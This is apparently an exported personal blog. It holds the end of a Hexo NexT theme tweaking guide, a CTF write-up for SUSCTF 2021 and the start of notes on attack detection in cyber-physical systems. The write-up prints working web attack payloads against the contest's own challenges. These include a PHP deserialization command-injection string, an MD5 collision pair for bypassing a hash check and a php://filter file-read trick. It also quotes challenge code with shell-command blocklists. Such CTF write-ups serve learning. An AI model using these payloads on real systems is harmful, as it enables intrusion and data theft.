<h3 id="编译时遇到未知路径问题"><a href="#编译时遇到未知路径问题" class="headerlink" title="编译时遇到未知路径问题"></a>编译时遇到未知路径问题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FATAL &#123;</span><br><span class="line">  err: Template render error: (unknown path)</span><br><span class="line">    Error: unexpected end of comment</span><br><span class="line">      at Object._prettifyError (D:\Document\Blog\node_modules\nunjucks\src\lib.js:36:11)</span><br><span class="line">      at Template.render (D:\Document\Blog\node_modules\nunjucks\src\environment.js:538:21)</span><br><span class="line">      at Environment.renderString (D:\Document\Blog\node_modules\nunjucks\src\environment.js:380:17)</span><br><span class="line">      at D:\Document\Blog\node_modules\hexo\lib\extend\tag.js:236:16</span><br><span class="line">      at tryCatcher (D:\Document\Blog\node_modules\bluebird\js\release\util.js:16:23)</span><br><span class="line">      at Function.Promise.fromNode.Promise.fromCallback (D:\Document\Blog\node_modules\bluebird\js\release\promise.js:209:30)</span><br></pre></td></tr></table></figure>

<p>这种是文章中出现未转义的括号造成的，尽量用 ` 进行转移，将其包裹成文本或代码形式</p>
<h2 id="不同的修改"><a href="#不同的修改" class="headerlink" title="不同的修改"></a>不同的修改</h2><p>版本：从参考地址下载的最新版（NexT 8.4.0 Released）</p>
<h3 id="圆形旋转头像"><a href="#圆形旋转头像" class="headerlink" title="圆形旋转头像"></a>圆形旋转头像</h3><p>打开<code>Blog\themes\hexo-theme-next-8.4.0\_config.yml</code>文件，将<code>rounded</code>和<code>rotated</code>都改成<code>true</code>即可</p>
<p><img src="/2021/05/09/Ref/image-20210510101136415.png" alt="image-20210510101136415"></p>
<h3 id="添加动态背景"><a href="#添加动态背景" class="headerlink" title="添加动态背景"></a>添加动态背景</h3><p><code>Blog\themes\hexo-theme-next-8.4.0\_config.yml</code>文件，定位<code>canvas</code>然后<code>enable=true</code>即可</p>
<h3 id="删除强力驱动"><a href="#删除强力驱动" class="headerlink" title="删除强力驱动"></a>删除强力驱动</h3><p>在<code>\Blog\themes\hexo-theme-next-8.4.0\layout\_partials\footer.njk</code>定位<code>powered</code>，将以下代码注释掉（<!-- -->）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.footer.powered %&#125;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;</span><br><span class="line">    &#123;%- set next_site = &#x27;https://theme-next.js.org&#x27; if theme.scheme === &#x27;Gemini&#x27; else &#x27;https://theme-next.js.org/&#x27; + theme.scheme | lower + &#x27;/&#x27; %&#125;</span><br><span class="line">    &#123;&#123;- __(&#x27;footer.powered&#x27;, next_url(&#x27;https://hexo.io&#x27;, &#x27;Hexo&#x27;, &#123;class: &#x27;theme-link&#x27;&#125;) + &#x27; &amp; &#x27; + next_url(next_site, &#x27;NexT.&#x27; + theme.scheme, &#123;class: &#x27;theme-link&#x27;&#125;)) &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>



<h3 id="修改文章底部带-号的标签"><a href="#修改文章底部带-号的标签" class="headerlink" title="修改文章底部带#号的标签"></a>修改文章底部带#号的标签</h3><p>打开<code>myblog/themes/next/layout/_macro/post.swig</code>文件，搜索<code>post.tags</code>，将 <code>if theme.tag_icon else &#39;#&#39;</code>删除即可</p>
<p><img src="/2021/05/09/Ref/image-20210510095812090.png" alt="image-20210510095812090"></p>
<p>效果：</p>
<p><img src="/2021/05/09/Ref/image-20210510095930542.png" alt="image-20210510095930542"></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Ref</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>SUS2021-WP</title>
    <url>/2021/03/20/SUS2021-WP/</url>
    <content><![CDATA[<p>分数：3319<br>排名：2</p>
<h2 id="Web-easycmd"><a href="#Web-easycmd" class="headerlink" title="[Web] easycmd"></a>[Web] easycmd</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$verify</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;verify === <span class="string">&quot;get flag&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(cat|\;|\&gt;|more|less|head|tail|tac|nl|grep|strings|\||\&amp;)/i&#x27;</span>, <span class="keyword">$this</span>-&gt;cmd)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;No way&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @system(<span class="string">&quot;echo <span class="subst">&#123;$this-&gt;cmd&#125;</span>&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;verify failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = unserialize(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure>

<ol>
<li>需要序列化verify和cmd  </li>
<li>这里需要注意，cmd的指令是经过echo的，所以需要<code>$()</code>在括号中加入待执行的指令，这里先看看根目录<code>ls /</code>  </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$verify</span>  = <span class="string">&quot;get flag&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&quot;$(ls /)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Flag(); </span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>拿到<a href="http://www.dooccn.com/php/">PHP在线</a>跑一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A7%3A%22%24%28ls+%2F%29%22%3B%7D  </span><br></pre></td></tr></table></figure></li>
<li><p>访问<a href="http://susctf.com:10001/index.php?flag=O:4:%22Flag%22:2:%7Bs:12:%22%00Flag%00verify%22;s:8:%22get+flag%22;s:9:%22%00Flag%00cmd%22;s:7:%22$(ls+/)%22;%7D">http://susctf.com:10001/index.php?flag=O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A7%3A%22%24%28ls+%2F%29%22%3B%7D</a><br><img src="/2021/03/20/SUS2021-WP/0_ezcmd.png">  </p>
</li>
<li><p>接下来获取flag，因为cat，more等等都被过滤了，所以<code>uniq /flag</code>序列化结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A13%3A%22%24%28uniq+%2Fflag%29%22%3B%7D  </span><br></pre></td></tr></table></figure></li>
<li><p>得到flag<br><img src="/2021/03/20/SUS2021-WP/01_flag.png"></p>
</li>
</ol>
<h2 id="Web-happy-web"><a href="#Web-happy-web" class="headerlink" title="[Web] happy_web"></a>[Web] happy_web</h2><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li><a href="http://susctf.com:10001/index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=">http://susctf.com:10001/index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=</a>  </li>
<li>img那段好像16进制ASCII，对应为aGlhaGlhLmpwZw==，base64解码结果为hiahia.jpg  </li>
<li>可以用img读取页面源码，所以先将<code>index.php</code>base64编码再转成16进制得到6157356b5a58677563476877  </li>
<li><code>/index.php?img=6157356b5a58677563476877&amp;cmd=</code>用Bp看下响应<br><img src="/2021/03/20/SUS2021-WP/02_Bp.png">  </li>
<li>将得到的base64解码，得到  </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = base64_decode(hex2bin(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./jz.jpg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;lmy shi wo da ge&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;bie xiang le&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is coooool&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">MD5强绕过</a>  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>同时cmd还过滤了一些字符，用dir看下<br><img src="/2021/03/20/SUS2021-WP/03_dir.png">  </li>
<li><code>dir /</code>空格用%20代替<br><img src="/2021/03/20/SUS2021-WP/04_flag.png">  </li>
<li><code>uniq%20/flag</code><br><img src="/2021/03/20/SUS2021-WP/05_flag.png"><br>SUSCTF{4c4f7d5fa95982aa2a3cec94905f1d66}</li>
</ol>
<h2 id="Web-LMY-de-miji"><a href="#Web-LMY-de-miji" class="headerlink" title="[Web] LMY_de_miji"></a>[Web] LMY_de_miji</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li><p>robots.txt提示Ss3cret.php  </p>
</li>
<li><p>查看<br><img src="/2021/03/20/SUS2021-WP/08_Ss3creta.png">  </p>
</li>
<li><p>因为过滤了input，data等等，所以用filter协议试试。<br><code>/Ss3cret.php?file=php://filter/read=convert.base64-encode/resource=f1f1fffl4g.php</code>  </p>
</li>
<li><p>另外，还要POST参数a和b，要求a与b不相等但它们的md5相等，这里md5比较是==可以用数组绕过，即<code>a[]=1&amp;b[]=2</code><br><img src="/2021/03/20/SUS2021-WP/09_filter.png">  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+DQoNCjxodG1sPg0KDQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQogICAgPHRpdGxlPkZMQUc8L3RpdGxlPg0KPC9oZWFkPg0KDQo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjp3aGl0ZTsiPjxicj48YnI+PGJyPjxicj48YnI+PGJyPg0KDQo8aDEgc3R5bGU9ImZvbnQtZmFtaWx5OnZlcmRhbmE7Y29sb3I6cmVkO3RleHQtYWxpZ246Y2VudGVyOyI+eW91IHdhbnQgZmxhZz9pdCdzIGluIGhlcmUsY2FuIHlvdSBmaW5kIGl0ID9+fn48L2gxPjxicj48YnI+PGJyPg0KPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPg0KICAgIDw/cGhwDQogICAgJGZsYWcgPSAiZmxhZyBpbiBmZmZmZmZmZmZsNDQ0NGciOw0KICAgID8+DQo8L3A+DQo8L2JvZHk+DQoNCjwvaHRtbD4NCg==</span><br></pre></td></tr></table></figure></li>
<li><p>base64解码得到  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;background-color:white;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;you want flag?it<span class="string">&#x27;s in here,can you find it ?~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">    $flag = &quot;flag in fffffffffl4444g&quot;;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>访问<code>http://susctf.com:10005/fffffffffl4444g</code><br><img src="/2021/03/20/SUS2021-WP/10_ffffffffff.png"></p>
</li>
</ol>
<h2 id="MISC-两只老虎爱跳舞"><a href="#MISC-两只老虎爱跳舞" class="headerlink" title="[MISC] 两只老虎爱跳舞"></a>[MISC] 两只老虎爱跳舞</h2><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>1234解压zip  </li>
<li><code>dd if=8695.tar.gz | openssl des3 -d -pbkdf2 -k 8695 | tar zxf -</code>解压tar.gz得到7303.tar.gz  </li>
<li><code>dd if=7303.tar.gz | openssl des3 -d -pbkdf2 -k 7303 | tar zxf -</code>得到1106.zip  </li>
<li>我直接裂开，不断套娃  </li>
<li>解压脚本如下(我写得好像有点啰嗦。。。)  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFile</span>(<span class="params">path</span>):</span></span><br><span class="line">    fileName = []</span><br><span class="line">    lst = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="built_in">print</span>(i+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        suffix = os.path.splitext(i)[<span class="number">1</span>]</span><br><span class="line">        key = i[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">        delRawFileCmd = <span class="string">&quot;rm &quot;</span> + path + <span class="string">&quot;/&quot;</span> + i</span><br><span class="line">        <span class="keyword">if</span> suffix == <span class="string">&quot;.zip&quot;</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -P &quot;</span> + key + <span class="string">&quot; &quot;</span> + path + <span class="string">&quot;/&quot;</span> + i</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> suffix == <span class="string">&quot;.gz&quot;</span>:</span><br><span class="line">            cmd = <span class="string">&quot;dd if=&quot;</span> + path + <span class="string">&quot;/&quot;</span> + i + <span class="string">&quot; | openssl des3 -d -pbkdf2 -k &quot;</span> + key + <span class="string">&quot;| tar zxf -&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> suffix == <span class="string">&quot;.py&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">// 开始存放<span class="number">1234.</span><span class="built_in">zip</span>压缩文件的目录</span><br><span class="line">path = <span class="string">&quot;/home/v/Desktop/yasuo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(os.listdir(path)):</span><br><span class="line">    getFile(path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ref https://blog.csdn.net/heda3/article/details/102535307</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li>最终得到mp3<br><img src="/2021/03/20/SUS2021-WP/06_mp3.png">  </li>
<li>mp3隐写<a href="https://cnpanda.net/ctf/342.html">参考</a><br>属性中<br><img src="/2021/03/20/SUS2021-WP/07_mf.png">  </li>
<li>用010Editor打开该音频文件，注意需要安装MP3.bt模板，结合private（MP3数据帧中的保留位）和mf[n]，猜测保留位private中隐写了数据。<br><img src="/2021/03/20/SUS2021-WP/11_private&padding.png">  </li>
<li>其中，89166是MPEG帧的起始地址，可以看到结构体中89166开始的12+1+2+1+4+2+1+1=16+8位达到private位，也就说第89168字节的最后一位正好是private的数值，倒数第二位为padding。这里还要关注padding的原因是：发现每个MPEG帧长不一定相同，会受到padding的影响，padding为0帧长就是1044，否则就是1045  </li>
<li>另外，循环的跳出条件是，遍历完所有MPEG帧，也就是一直到1275124<br><img src="/2021/03/20/SUS2021-WP/12_MPEG%E5%B8%A7.png">  </li>
<li>提取代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">89168</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;D:\\Document\\CTF\\SUS2021\\Misc\\两只老虎爱跳舞\\小兔子乖乖拔萝卜\\Do_you_know_private.mp3&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> n &lt; <span class="number">1275124</span>:</span><br><span class="line">    file.seek(n, <span class="number">0</span>)</span><br><span class="line">    private_related_byte = file.read(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(private_related_byte)</span><br><span class="line">    private_val = <span class="built_in">bin</span>(bytes_to_long(private_related_byte))[-<span class="number">1</span>]</span><br><span class="line">    result = result + private_val</span><br><span class="line">    padding_val = <span class="built_in">bin</span>(bytes_to_long(private_related_byte))[-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> padding_val == <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> padding_val == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        n = n + <span class="number">1044</span> + <span class="built_in">int</span>(padding_val, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">bin_lst = re.findall(<span class="string">&#x27;.&#123;&#x27;</span>+<span class="built_in">str</span>(<span class="number">8</span>)+<span class="string">&#x27;&#125;&#x27;</span>, result)</span><br><span class="line"><span class="built_in">print</span>(bin_lst)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bin_lst:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<ol start="12">
<li>打印U1VTQ1RGJTdCRDBfeTB1X2wxazNfZDRuYzFuZyU3RA==  </li>
<li>base64解码SUSCTF%7BD0_y0u_l1k3_d4nc1ng%7D  </li>
<li>将左右括号%7B和%7D改过来即可</li>
</ol>
<h2 id="MISC-Word"><a href="#MISC-Word" class="headerlink" title="[MISC] Word"></a>[MISC] Word</h2><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>word中提示了JPG_encryption，但是并没有发现隐藏图片<br><img src="/2021/03/20/SUS2021-WP/14_word.png">  </li>
<li>将后缀名改为zip再解压缩发现了一个guessguessguess.xml，用010Editor看到其文件头是jfif，将其改为jpg可以打开<br><img src="/2021/03/20/SUS2021-WP/15_gougou.png">  </li>
<li>jpg格式不能隐写，用stegdetect也没检测到什么结果，直到我查到一个工具叫<a href="https://github.com/crorvick/outguess.git">outguess</a>，这个文件名就在疯狂暗示  </li>
<li><code>outguess -k &quot;What_do_you_know_about_JPG_encryption&quot; -r guessguessguess.jpg hidden.txt</code>  </li>
<li>SUSCTF{Congr4tulat1on5_Y0u_gu3ssed_1t}</li>
</ol>
<h2 id="Crypto-ezXOR"><a href="#Crypto-ezXOR" class="headerlink" title="[Crypto] ezXOR"></a>[Crypto] ezXOR</h2><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>xortool -c 20 enc.txt</code><br><img src="/2021/03/20/SUS2021-WP/13_xor.png"><br>SUSCTF{XOR_t00l_cAn_so1ve_1t}</p>
<h2 id="Re-0-year-old-re"><a href="#Re-0-year-old-re" class="headerlink" title="[Re] 0-year-old-re"></a>[Re] 0-year-old-re</h2><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>答案就在明面上D500B61B-9270-41CB-9EB4-FEDF3C5FC101<br><img src="/2021/03/20/SUS2021-WP/14_flag.png">  </li>
</ol>
<h2 id="Misc-签到到到到"><a href="#Misc-签到到到到" class="headerlink" title="[Misc] 签到到到到"></a>[Misc] 签到到到到</h2><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>先base58再base85，这里借助CyberChef_v8.31.1完成<br><img src="/2021/03/20/SUS2021-WP/16_misc.png">  </li>
<li>SUSCTF{Welc0m3_t0_th3_c0mpet1tion}</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>信息物理系统的攻击检测与安全状态估计 笔记</title>
    <url>/2021/05/10/%E4%BF%A1%E6%81%AF%E7%89%A9%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%AE%89%E5%85%A8%E7%8A%B6%E6%80%81%E4%BC%B0%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
<li>有限时间异常检测器：负责在预设的有限时间内检测攻击（异常）</li>
<li>系统安全状态观测器：负责状态评估，并在检测到攻击时，调整系统以确保安全状态</li>
</ul>
<p>安全状态估计：是从一组有噪声或被破坏的测量值中估计动态系统状态</p>
<p>本文概要：提出一种<strong>有限时间检测器</strong>来检测<strong>执行器</strong>攻击下系统的状态，并设计<strong>观测器</strong>对系统状态进行<strong>安全估计</strong></p>
<h3 id="1-信息物理系统建模"><a href="#1-信息物理系统建模" class="headerlink" title="1 信息物理系统建模"></a>1 信息物理系统建模</h3><h4 id="1-1-物理进程模型"><a href="#1-1-物理进程模型" class="headerlink" title="1.1 物理进程模型"></a>1.1 物理进程模型</h4><p>用微分/差分方程组进行描述：比如线性系统的状态空间模型</p>
<h4 id="1-2-信息传输处理进程模型"><a href="#1-2-信息传输处理进程模型" class="headerlink" title="1.2 信息传输处理进程模型"></a>1.2 信息传输处理进程模型</h4><p>用编码解码，加解密进行描述</p>
<h4 id="1-3-攻击的具象"><a href="#1-3-攻击的具象" class="headerlink" title="1.3 攻击的具象"></a>1.3 攻击的具象</h4><ul>
<li>作用到进程的未知输入</li>
<li>对传输过程的破坏</li>
<li>对传输信息的篡改</li>
</ul>
